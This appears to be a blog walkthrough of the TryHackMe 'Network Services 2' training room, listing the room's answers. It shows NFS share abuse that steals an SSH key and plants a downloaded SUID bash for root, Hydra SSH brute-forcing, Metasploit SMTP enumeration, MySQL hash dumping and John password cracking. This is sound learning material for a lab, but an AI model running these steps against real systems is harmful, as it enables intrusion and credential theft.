<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en"><head>

<meta charset="utf-8">
<meta name="generator" content="quarto-0.9.334">

<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">

<meta name="author" content="hacker_newb">
<meta name="dcterms.date" content="2023-07-29">

<title>hacking newb - Network Services 2</title>
<style>
code{white-space: pre-wrap;}
span.smallcaps{font-variant: small-caps;}
span.underline{text-decoration: underline;}
div.column{display: inline-block; vertical-align: top; width: 50%;}
div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
ul.task-list{list-style: none;}
</style>

<script src="../../site_libs/quarto-nav/quarto-nav.js"></script>
<script src="../../site_libs/quarto-nav/headroom.min.js"></script>
<script src="../../site_libs/clipboard/clipboard.min.js"></script>
<meta name="quarto:offset" content="../../">
<script src="../../site_libs/quarto-search/autocomplete.umd.js"></script>
<script src="../../site_libs/quarto-search/fuse.min.js"></script>
<script src="../../site_libs/quarto-search/quarto-search.js"></script>
<script src="../../site_libs/quarto-html/quarto.js"></script>
<script src="../../site_libs/quarto-html/popper.min.js"></script>
<script src="../../site_libs/quarto-html/tippy.umd.min.js"></script>
<script src="../../site_libs/quarto-html/anchor.min.js"></script>
<link href="../../site_libs/quarto-html/tippy.css" rel="stylesheet">
<link id="quarto-text-highlighting-styles" href="../../site_libs/quarto-html/quarto-syntax-highlighting-dark.css" rel="stylesheet">
<script src="../../site_libs/bootstrap/bootstrap.min.js"></script>
<link href="../../site_libs/bootstrap/bootstrap-icons.css" rel="stylesheet">
<link href="../../site_libs/bootstrap/bootstrap.min.css" rel="stylesheet">
<script id="quarto-search-options" type="application/json">{
  "location": "navbar",
  "copy-button": false,
  "collapse-after": 3,
  "panel-placement": "end",
  "type": "overlay",
  "limit": 20,
  "language": {
    "search-no-results-text": "No results",
    "search-matching-documents-text": "matching documents",
    "search-copy-link-title": "Copy link to search",
    "search-hide-matches-text": "Hide additional matches",
    "search-more-match-text": "more match in this document",
    "search-more-matches-text": "more matches in this document",
    "search-clear-button-title": "Clear",
    "search-detached-cancel-button-title": "Cancel",
    "search-submit-button-title": "Submit"
  }
}</script>


<link rel="stylesheet" href="../../styles.css">
</head>

<body class="nav-fixed fullcontent">

<div id="quarto-search-results"></div>
  <header id="quarto-header" class="headroom fixed-top">
    <nav class="navbar navbar-expand-lg navbar-dark ">
      <div class="navbar-container container-fluid">
      <a class="navbar-brand" href="../../index.html">
    <span class="navbar-title">hacking newb</span>
  </a>
          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation" onclick="if (window.quartoToggleHeadroom) { window.quartoToggleHeadroom(); }">
  <span class="navbar-toggler-icon"></span>
</button>
          <div class="collapse navbar-collapse" id="navbarCollapse">
            <ul class="navbar-nav navbar-nav-scroll ms-auto">
  <li class="nav-item">
    <a class="nav-link" href="../../about.html">About</a>
  </li>  
  <li class="nav-item">
    <a class="nav-link" href="../../reference.html">References</a>
  </li>  
  <li class="nav-item compact">
    <a class="nav-link" href="https://github.com/"><i class="bi bi-github" role="img">
</i> 
 </a>
  </li>  
  <li class="nav-item compact">
    <a class="nav-link" href="https://infosec.exchange/@hacker_newb"><i class="bi bi-mastodon" role="img">
</i> 
 </a>
  </li>  
</ul>
              <div id="quarto-search" class="" title="Search"></div>
          </div> <!-- /navcollapse -->
      </div> <!-- /container-fluid -->
    </nav>
</header>
<!-- content -->
<header id="title-block-header" class="quarto-title-block default page-columns page-full">
  <div class="quarto-title-banner page-columns page-full">
    <div class="quarto-title column-body">
      <h1 class="title">Network Services 2</h1>
                          <div class="quarto-categories">
                <div class="quarto-category">TryHackMe</div>
                <div class="quarto-category">Network</div>
              </div>
                  </div>
  </div>
    
  



  <div class="quarto-title-meta">

      <div>
      <div class="quarto-title-meta-heading">Author</div>
      <div class="quarto-title-meta-contents">
               <p>hacker_newb </p>
            </div>
    </div>
      
      <div>
      <div class="quarto-title-meta-heading">Published</div>
      <div class="quarto-title-meta-contents">
        <p class="date">July 29, 2023</p>
      </div>
    </div>
      
    </div>
    
  
  </header><div id="quarto-content" class="quarto-container page-columns page-rows-contents page-layout-article page-navbar">
<!-- sidebar -->
<!-- margin-sidebar -->
    
<!-- main -->
<main class="content quarto-banner-title-block" id="quarto-document-content">




<p>Network Services 2. This room is a sequel to the first network services room. Similarly, it will explore a few more common Network Service vulnerabilities and misconfigurations that you’re likely to find in CTFs, and some penetration test scenarios.</p>
<p><img width="800" src="boxes.png"></p>
<section id="task-2" class="level2">
<h2 class="anchored" data-anchor-id="task-2">Task 2</h2>
<p>NFS stands for “Network File System” and allows a system to share directories and files with others over a network. With NFS, users and programs can access files on remote systems almost as if they were local files. NFS is a distributed file system protocol and is not encrypted, no user authentication by default.</p>
<ul>
<li>NFS mounts all, or a portion of a file system on a server. The portion of the file system that is mounted can be accessed by clients with whatever privileges are assigned to each file.</li>
</ul>
<p>How it works:</p>
<ol type="1">
<li>client will request to mount a directory from a remote host on a local directory just the same way it can mount a physical device</li>
<li>The mount service will then act to connect to the relevant mount daemon using RPC.</li>
<li>The server checks if the user has permission to mount whatever directory has been requested</li>
<li>It will then return a file handle which uniquely identifies each file and directory that is on the server.</li>
</ol>
<p>If someone wants to access a file using NFS, an RPC call is placed to NFSD (the NFS daemon) on the server. This call takes parameters such as:</p>
<ul>
<li>file handle</li>
<li>name of file to be accessed</li>
<li>user ID</li>
<li>user’s group ID</li>
</ul>
<p>These parameters are used in determining access rights to the specified file. This is what controls user permissions (read and write of files).</p>
<p>Using the NFS protocol, you can transfer files between computers running Windows and other non-Windows operating systems, such as Linux, MacOS or UNIX.</p>
<ul>
<li>A computer running Windows Server can act as an NFS file server for other non-Windows client computers.</li>
<li>NFS allows a Windows-based computer running Windows Server to access files stored on a non-Windows NFS server.</li>
</ul>
<p>Question: <em>What does NFS stand for?</em></p>
<ul>
<li>network file system</li>
</ul>
<p>Question: <em>What process allows an NFS client to interact with a remote directory as though it was a physical device?</em></p>
<ul>
<li>hint: What does your Operating System do to access a physical drive?</li>
<li>mounting</li>
</ul>
<p>Question: <em>What does NFS use to represent files and directories on the server?</em></p>
<ul>
<li>file handle</li>
</ul>
<p>Question: <em>What protocol does NFS use to communicate between the server and client?</em></p>
<ul>
<li>RPC</li>
</ul>
<p>Question: <em>What two pieces of user data does the NFS server take as parameters for controlling user permissions? Format: parameter 1 / parameter 2</em></p>
<ul>
<li>user id / group id</li>
</ul>
<p>Question: <em>Can a Windows NFS server share files with a Linux client? (Y/N)</em></p>
<ul>
<li>yes</li>
</ul>
<p>Question: <em>Can a Linux NFS server share files with a MacOS client? (Y/N)</em></p>
<ul>
<li>yes</li>
</ul>
<p>Question: <em>What is the latest version of NFS? [released in 2016, but is still up to date as of 2020] This will require external research.</em></p>
<ul>
<li>4.2</li>
</ul>
</section>
<section id="task-3" class="level2">
<h2 class="anchored" data-anchor-id="task-3">Task 3</h2>
<p>Enumeration is step 1 in the process, and for this NFS we need to have NFS Share tool (<code>nfs-common</code>)</p>
<ul>
<li>nsf-common has programs <code>lockd</code>, <code>statd</code>, <code>showmount</code>, <code>nsfstat</code>, <code>gssd</code>, <code>idmapd</code> and <code>mount.nfs</code></li>
<li>important ones are ‘showmount’ and ‘mount.nfs’</li>
<li>to install <code>sudo apt install nfs-common</code> but is installed on Kali and is in AttackBox</li>
</ul>
<p>As usual nmap is part of enumeration.</p>
<p>Mounting NFS shares:</p>
<ul>
<li>client system needs a directory where all the content shared by the host server in the export folder can be accessed</li>
<li>create this folder anywhere on your system</li>
<li>now use “mount” command to connect to NFS share to the moint point on your machine</li>
<li><code>sudo mount -t nfs IP:share /tmp/mount/ -nolock</code></li>
</ul>
<table class="table">
<thead>
<tr class="header">
<th>tag</th>
<th>function</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>sudo</td>
<td>run as root</td>
</tr>
<tr class="even">
<td>mount</td>
<td>execute mount</td>
</tr>
<tr class="odd">
<td>-t</td>
<td>type of device</td>
</tr>
<tr class="even">
<td>IP:share</td>
<td>IP of NFS server: name of share to mount</td>
</tr>
<tr class="odd">
<td>-nolock</td>
<td>not to use NLM locking</td>
</tr>
</tbody>
</table>
<p>Now time for nmap scanning.</p>
<p>Question: <em>Conduct a thorough port scan scan of your choosing, how many ports are open?</em></p>
<ul>
<li>7</li>
</ul>
<p>Question: <em>Which port contains the service we’re looking to enumerate?</em></p>
<ul>
<li>2049</li>
</ul>
<p>Question: <em>Now, use /usr/sbin/showmount -e [IP] to list the NFS shares, what is the name of the visible share?</em></p>
<ul>
<li>terminal: <code>/usr/sbin/showmount -e IP</code></li>
<li>/home</li>
</ul>
<p>Now we mount the share to our local machine.</p>
<ul>
<li><code>mkdir /tmp/mount</code> to create a mount directory</li>
<li>it is temporary so deleted on restart</li>
<li>use mount command, <code>sudo mount -t nfs IP:share /tmp/mount/ -nolock</code> type as is</li>
<li>now <code>cd /tmp/mount/home/</code></li>
</ul>
<p>Question: <em>Change directory to where you mounted the share- what is the name of the folder inside?</em></p>
<ul>
<li>cappucino</li>
</ul>
<p>Have a look inside this directory, look at the files. Looks like we’re inside a user’s home directory.</p>
<ul>
<li><code>ls -la</code></li>
</ul>
<p>Question: <em>Which of these folders could contain keys that would give us remote access to the server?</em></p>
<ul>
<li><code>cd .ssh</code></li>
</ul>
<p>Question: <em>Which of these keys is most useful to us?</em></p>
<ul>
<li>hint: What is the default name of an SSH identity file?</li>
<li>id_rsa</li>
</ul>
<p>Copy this file to a different location your local machine, and change the permissions to “600” using “chmod 600 [file]”.</p>
<ul>
<li><code>cp id_rsa ~/Desktop</code> &gt; new tab <code>cd ~/Desktop</code> &gt; <code>chmod 600 id_rsa</code></li>
<li>in the <code>.ssh/</code> &gt; <code>cat authorized_keys</code> &gt; “cappucino@polonfs”</li>
</ul>
<p>Question: <em>Can we log into the machine using ssh -i <key-file> <username>@<ip> ? (Y/N)</ip></username></key-file></em></p>
<ul>
<li><code>ssh -i id_rsa IP</code></li>
</ul>
</section>
<section id="task-4" class="level2">
<h2 class="anchored" data-anchor-id="task-4">Task 4</h2>
<p>if you have a low privilege shell on any machine and you found that a machine has an NFS share you might be able to use that to escalate privileges, depending on how it is configured.</p>
<p>NFS has Root Squashing:</p>
<ul>
<li>root squashing (when enabled) prevents anyone connecting to the NFS share from having root access to the NFS volume</li>
<li>Remote root users are assigned a user “nfsnobody” when connected, which has the least local privileges.</li>
<li>If turned off, it allows SUID bit files to be created, allowing remote user root access</li>
<li>SUID files can be run with permissions of owner/group as super-user</li>
<li></li>
</ul>
<p>Method:</p>
<ul>
<li>upload files to NFS share, control the permissions of files</li>
<li>file permissions to be bash executable</li>
<li>log into SSH</li>
<li>execute the bash script and get root shell</li>
</ul>
<p>The executable bash script (download file):</p>
<pre><code>wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash</code></pre>
<ul>
<li>in AttackBox paste the link and hit enter</li>
</ul>
<p>Process:</p>
<ol type="1">
<li>NFS access</li>
<li>gain low privilege shell</li>
<li>upload bash executable to NFS share</li>
<li>set SUID permission through NFS (misconfigured root squash)</li>
<li>login via SSH</li>
<li>execute SUID bit bash executable</li>
</ol>
<ul>
<li><code>cp ~/Desktop/bash /tmp/mount/home/</code> , I downloaded bash file onto desktop and moved to home</li>
<li><code>sudo chown root bash</code></li>
<li><code>sudo chmod +x bash</code> shows -rwxr-xr-x</li>
</ul>
<p>Question: <em>Now, we’re going to add the SUID bit permission to the bash executable we just copied to the share using “sudo chmod +[permission] bash”. What letter do we use to set the SUID bit set using chmod?</em></p>
<ul>
<li>s</li>
<li><code>sudo chmod +s bash</code> shows -rwsr-sr-x</li>
</ul>
<p>The bash file should be in path <code>/tmp/mount/home/cappucino/</code></p>
<ul>
<li><code>cd /root/</code> &gt; <code>ls</code></li>
<li>root.txt &gt; <code>cat root.txt</code> and get the flag</li>
</ul>
</section>
<section id="task-5" class="level2">
<h2 class="anchored" data-anchor-id="task-5">Task 5</h2>
<p>SMTP stands for “Simple Mail Transfer Protocol”, it is utilised to handle the sending of emails. In order to support email services, a protocol pair is required, comprising of SMTP and POP/IMAP (send outgoing mail and retrieve incoming mail).</p>
<p><img height="650" src="SMTP.png"></p>
<p>SMTP functions:</p>
<ul>
<li>verifies who is sending emails through SMTP server</li>
<li>send outgoing mail</li>
<li>if mail can’t be delivered, then return message to sender</li>
</ul>
<p>POP, or “Post Office Protocol” and IMAP, “Internet Message Access Protocol” are both email protocols who are responsible for the transfer of email between a client and a mail server.</p>
<ul>
<li>POP’s more simplistic approach of downloading the inbox from the mail server, to the client.</li>
<li>IMAP will synchronise the current inbox, with new mail on the server, downloading anything new.</li>
</ul>
<p>This means that changes to the inbox made on one computer, over IMAP, will persist if you then synchronise the inbox from another computer.</p>
<p>How SMTP works:</p>
<ul>
<li>user will supply the email (a letter) and a service (the postal delivery service)</li>
<li>role of the SMTP server in this service, is to act as the sorting office</li>
<li>the email (letter) is picked up and sent to this server, which then directs it to the recipient</li>
</ul>
<ol type="1">
<li>the mail user agent (your email client or external program) connects to SMTP server, starts a SMTP handshake, runs on port 25, is validated and SMTP session starts</li>
<li>sending mail process, client submits [the sender &amp; recipient’s email address] + [email body] + [attachments] to server</li>
<li>SMTP server checks if domain name of recipient &amp; sender is the same</li>
<li>SMTP server of sender will make a connection to recipient’s SMTP server <em>before</em> sending email. If not accessible then the email is put into a queue</li>
<li>recipient’s SMTP server will verify the incoming email, checking if domain &amp; user name have been recognized, then server will forward the email to POP/IMAP</li>
<li>recipient will get email in inbox</li>
</ol>
<p>Question: <em>What does SMTP stand for?</em></p>
<ul>
<li>Simple Mail Transfer Protocol</li>
</ul>
<p>Question: <em>What does SMTP handle the sending of? (answer in plural)</em></p>
<ul>
<li>emails</li>
</ul>
<p>Questions: <em>What is the first step in the SMTP process?</em></p>
<ul>
<li>SMTP handshake</li>
</ul>
<p>Question: <em>What is the default SMTP port?</em></p>
<ul>
<li>25</li>
</ul>
<p>Question: <em>Where does the SMTP server send the email if the recipient’s server is not available?</em></p>
<ul>
<li>SMTP queue</li>
</ul>
<p>Question: <em>On what server does the Email ultimately end up on?</em></p>
<ul>
<li>POP/IMAP</li>
</ul>
<p>Question: <em>Can a Linux machine run an SMTP server? (Y/N)</em></p>
<ul>
<li>y</li>
</ul>
<p>Question: <em>Can a Windows machine run an SMTP server? (Y/N)</em></p>
<ul>
<li>y</li>
</ul>
</section>
<section id="task-6" class="level2">
<h2 class="anchored" data-anchor-id="task-6">Task 6</h2>
<p>Enumerating poorly configured mail servers can provide a starting place into a network. Need to fingerprint the server to make our targeting as precise as possible.</p>
<ul>
<li>using ‘smtp_version’ module of a Metasploit, which will scan a range of IP addresses and determine the version of any mail server</li>
<li>using module ‘smtp_enum’ that will enumerate users, uses a host or range to scan plus a wordlist that has usernames</li>
<li>Metasploit is installed in Kali and Parrot OS</li>
</ul>
<p>SMTP service has 2 internal commands that allow the enumeration of users:</p>
<ul>
<li>VRFY which confirms the names of valid users</li>
<li>EXPNwhich reveals the address of user’s aliases &amp; lists of email commands</li>
</ul>
<p>Enumeration run nmap scan.</p>
<p>Question: <em>First, lets run a port scan against the target machine, same as last time. What port is SMTP running on?</em></p>
<ul>
<li>25</li>
</ul>
<p>Question: <em>Start Metasploit. What command do we use to do this?</em></p>
<ul>
<li>msfconsole</li>
</ul>
<p>Question: <em>Let’s search for the module “smtp_version”, what’s it’s full module name?</em></p>
<ul>
<li>auxiliary/scanner/smtp/smtp_version</li>
</ul>
<p>Question: <em>Great, now- select the module and list the options. How do we do this?</em></p>
<ul>
<li><code>use 0</code> &gt; <code>options</code></li>
</ul>
<p>Question: <em>Have a look through the options, does everything seem correct? What is the option we need to set?</em></p>
<ul>
<li>RHOSTS</li>
<li><code>set RHOSTS IP</code></li>
</ul>
<p>Question: <em>Set that to the correct value for your target machine. Then run the exploit. What’s the system mail name?</em></p>
<ul>
<li>after setting the RHOSTS IP address &gt; type <code>run</code></li>
<li><code>polosmtp.home</code></li>
</ul>
<p>Question: <em>What Mail Transfer Agent (MTA) is running the SMTP server? This will require some external research.</em></p>
<ul>
<li>hint: If I want to send a letter to my friend I have to <code>****</code> it.</li>
<li>Postfix</li>
</ul>
<p>Question: <em>We’ve now got a good amount of information on the target system to move onto the next stage. Let’s search for the module “smtp_enum”, what’s it’s full module name?</em></p>
<ul>
<li>auxiliary/scanner/smtp/smtp_enum</li>
</ul>
<p>We’re going to be using the “top-usernames-shortlist.txt” wordlist from the Usernames subsection of seclists (/usr/share/wordlists/SecLists/Usernames if you have it installed).</p>
<p>Seclists is an amazing collection of wordlists. If you’re running Kali or Parrot you can install seclists with: “sudo apt install seclists”.</p>
<p>Question: <em>What option do we need to set to the wordlist’s path?</em></p>
<ul>
<li>user_file</li>
<li>set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt</li>
<li>[AttackBox] inside the msfconsole: set USER_FILE ~/Tools/wordlists/SecLists/Usernames/top-usernames-shortlist.txt</li>
</ul>
<p>Question: <em>Once we’ve set this option, what is the other essential paramater we need to set?</em></p>
<ul>
<li>RHOSTS</li>
<li>set THREADS 16</li>
</ul>
<p>Now, run the exploit, this may take a few minutes, so grab a cup of tea, coffee, water.</p>
<p>Question: <em>Okay! Now that’s finished, what username is returned?</em></p>
<ul>
<li>[did not get scan to work, answer is from walkthrough] administrator</li>
</ul>
</section>
<section id="task-7" class="level2">
<h2 class="anchored" data-anchor-id="task-7">Task 7</h2>
<p>The information we have: user account, type of SMTP, the OS, port 25 is open same with a SSH port.</p>
<p>Bruteforce the password using Hydra.</p>
<ul>
<li>syntax: <code>hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV target_IP ssh</code></li>
<li>polosmtp.home &gt; username: administrator</li>
<li>use syntax above and put in administrator instead of USERNAME and run</li>
</ul>
<p>Question: <em>What is the password of the user we found during our enumeration stage?</em></p>
<ul>
<li>alejandro</li>
</ul>
<p>Question: <em>Great! Now, let’s SSH into the server as the user, what is contents of smtp.txt</em></p>
<ul>
<li><code>ssh administrator@IP_address</code> &gt; alejandro</li>
<li><code>ls</code> &gt; <code>cat smtp.txt</code> and get the flag</li>
</ul>
</section>
<section id="task-8" class="level2">
<h2 class="anchored" data-anchor-id="task-8">Task 8</h2>
<p>MySQL is a relational database management system (RDBMS) based on Structured Query Language (SQL).</p>
<p>RDBMS - A software or service used to create and manage databases based on a relational model. The word “relational” just means that the data stored in the dataset is organised as tables. Every table relates in some way to each other’s “primary key” or other “key” factors.</p>
<p>The server handles all database instructions like creating, editing, and accessing data. It takes and manages these requests and communicates using the MySQL protocol. This whole process can be broken down into these stages:</p>
<ol type="1">
<li>MySQL creates a database for storing and manipulating data, defining the relationship of each table.</li>
<li>Clients make requests by making specific statements in SQL.</li>
<li>The server will respond to the client with whatever information has been requested.</li>
</ol>
<p>MySQL runs all operating systems.</p>
<p>Question: <em>What type of software is MySQL?</em></p>
<ul>
<li>relational database management system</li>
</ul>
<p>Question: <em>What language is MySQL based on?</em></p>
<ul>
<li>sql</li>
</ul>
<p>Question: <em>What communication model does MySQL use?</em></p>
<ul>
<li>client-server</li>
</ul>
<p>Question: <em>What is a common application of MySQL?</em></p>
<ul>
<li>back end database</li>
</ul>
<p>Question: <em>What major social network uses MySQL as their back-end database? This will require further research.</em></p>
<ul>
<li>facebook</li>
</ul>
</section>
<section id="task-9" class="level2">
<h2 class="anchored" data-anchor-id="task-9">Task 9</h2>
<p>MySQL is likely not going to be the first point of call when getting initial information about the server. You can, as we have in previous tasks, attempt to brute-force default account passwords if you really don’t have any other information; however, in most CTF scenarios, this is unlikely to be the avenue you’re meant to pursue.</p>
<p>This task <em>assumes</em> you have found the credentials “root:password” when enumerating the subdomain web server, trying to login SSH and try against MySQL.</p>
<ul>
<li>install MySQL if not already installed: <code>sudo apt install default-mysql-client</code></li>
<li>using Metasploit for this</li>
</ul>
<p>Question: <em>As always, let’s start out with a port scan, so we know what port the service we’re trying to attack is running on. What port is MySQL using?</em></p>
<ul>
<li>3306</li>
</ul>
<p><em>Good, now we have to set of credentials. Let’s double check that by manually connecting to the MySQL server. We can do this using the command “mysql -h [IP] -u [username] -p”.</em></p>
<p><em>Okay, we know that our login credentials work. Lets quit out of this session with “exit” and launch up Metasploit.</em></p>
<ul>
<li>Metasploit: ‘mysql_sql’ module &gt; <code>info 0</code></li>
<li>password/rhosts/username</li>
</ul>
<p>Question: <em>Run the exploit. By default it will test with the “select version()” command, what result does this give you?</em></p>
<ul>
<li>set PASSWORD password &gt; set RHOSTS IP &gt; set USERNAME root</li>
<li><code>run</code></li>
<li><code>5.7.29-0ubuntu0.18.04.1</code></li>
</ul>
<p>Question: <em>Change the “sql” option to “show databases”. how many databases are returned?</em></p>
<ul>
<li>set SQL show databases &gt; run</li>
<li>4</li>
</ul>
</section>
<section id="task-10" class="level2">
<h2 class="anchored" data-anchor-id="task-10">Task 10</h2>
<p>The information we know: MySQL server credntials root:password, version of MySQL and that there are 4 databases.</p>
<ul>
<li>syntax is <code>create schema</code> (not create database)</li>
</ul>
<p>Question: <em>Let’s search for and select the “mysql_schemadump” module. What’s the module’s full name?</em></p>
<ul>
<li>msfconsole &gt; search mysql_schemadump</li>
<li><code>auxiliary/scanner/mysql/mysql_schemadump</code></li>
<li><code>x$waits_global_by_latency</code></li>
</ul>
<p>Question:<em>Awesome, you have now dumped the tables, and column names of the whole database. But we can do one better… search for and select the “mysql_hashdump” module. What’s the module’s full name?</em></p>
<ul>
<li><code>auxiliary/scanner/mysql/mysql_hashdump</code></li>
</ul>
<p>Question: <em>Again, I’ll let you take it from here. Set the relevant options, run the exploit. What non-default user stands out to you?</em></p>
<ul>
<li>use 0 &gt; options</li>
<li>set RHOSTS IP &gt; set USERNAME root &gt; set PASSWORD password &gt; run</li>
<li>carl</li>
</ul>
<p>Question: _Another user! And we have their password hash. This could be very interesting. Copy the hash string in full, like: bob:*HASH to a text file on your local machine called “hash.txt”._</p>
<ul>
<li><code>nano hash.txt</code></li>
<li>copy &amp; paste <code>carl:*EA031893AA21444B170FC2162A56978B8CEECE18</code></li>
</ul>
<p>Question: <em>Now, we need to crack the password! Let’s try John the Ripper against it using: “john hash.txt” what is the password of the user we found?</em></p>
<ul>
<li><code>john hash.txt</code></li>
<li>doggie</li>
</ul>
<p>Question: <em>Awesome. Password reuse is not only extremely dangerous, but extremely common. What are the chances that this user has reused their password for a different service?</em></p>
<ul>
<li>carl:doggie</li>
<li>try SSH</li>
<li>ls &gt; cat MySQL.txt and get the flag</li>
</ul>
</section>
<section id="reference" class="level2">
<h2 class="anchored" data-anchor-id="reference">Reference</h2>
<ul>
<li><a href="https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html">Oracle - how NFS works</a></li>
<li><a href="https://wiki.archlinux.org/title/NFS">Arch Linux - NFS</a></li>
<li><a href="https://en.wikipedia.org/wiki/Network_File_System">Wiki - Network File System</a></li>
<li><a href="https://jinshiranai.hashnode.dev/tryhackme-network-services-2-room">Network Services 2 walkthrough</a></li>
<li><a href="https://computer.howstuffworks.com/e-mail-messaging/email3.htm">SMTP protocol</a></li>
<li><a href="https://youtu.be/cxwwEz7LJSA">Mr Ash Co (YouTube) – Network Services 2</a></li>
<li></li>
</ul>


</section>

</main> <!-- /main -->
<script id="quarto-html-after-body" type="application/javascript">
window.document.addEventListener("DOMContentLoaded", function (event) {
  const icon = "";
  const anchorJS = new window.AnchorJS();
  anchorJS.options = {
    placement: 'right',
    icon: icon
  };
  anchorJS.add('.anchored');
  const clipboard = new window.ClipboardJS('.code-copy-button', {
    target: function(trigger) {
      return trigger.previousElementSibling;
    }
  });
  clipboard.on('success', function(e) {
    // button target
    const button = e.trigger;
    // don't keep focus
    button.blur();
    // flash "checked"
    button.classList.add('code-copy-button-checked');
    var currentTitle = button.getAttribute("title");
    button.setAttribute("title", "Copied!");
    setTimeout(function() {
      button.setAttribute("title", currentTitle);
      button.classList.remove('code-copy-button-checked');
    }, 1000);
    // clear code selection
    e.clearSelection();
  });
  function tippyHover(el, contentFn) {
    const config = {
      allowHTML: true,
      content: contentFn,
      maxWidth: 500,
      delay: 100,
      arrow: false,
      appendTo: function(el) {
          return el.parentElement;
      },
      interactive: true,
      interactiveBorder: 10,
      theme: 'quarto',
      placement: 'bottom-start'
    };
    window.tippy(el, config); 
  }
  const noterefs = window.document.querySelectorAll('a[role="doc-noteref"]');
  for (var i=0; i<noterefs.length; i++) {
    const ref = noterefs[i];
    tippyHover(ref, function() {
      let href = ref.getAttribute('href');
      try { href = new URL(href).hash; } catch {}
      const id = href.replace(/^#\/?/, "");
      const note = window.document.getElementById(id);
      return note.innerHTML;
    });
  }
  var bibliorefs = window.document.querySelectorAll('a[role="doc-biblioref"]');
  for (var i=0; i<bibliorefs.length; i++) {
    const ref = bibliorefs[i];
    const cites = ref.parentNode.getAttribute('data-cites').split(' ');
    tippyHover(ref, function() {
      var popup = window.document.createElement('div');
      cites.forEach(function(cite) {
        var citeDiv = window.document.createElement('div');
        citeDiv.classList.add('hanging-indent');
        citeDiv.classList.add('csl-entry');
        var biblioDiv = window.document.getElementById('ref-' + cite);
        if (biblioDiv) {
          citeDiv.innerHTML = biblioDiv.innerHTML;
        }
        popup.appendChild(citeDiv);
      });
      return popup.innerHTML;
    });
  }
});
</script>
</div> <!-- /content -->



</body></html>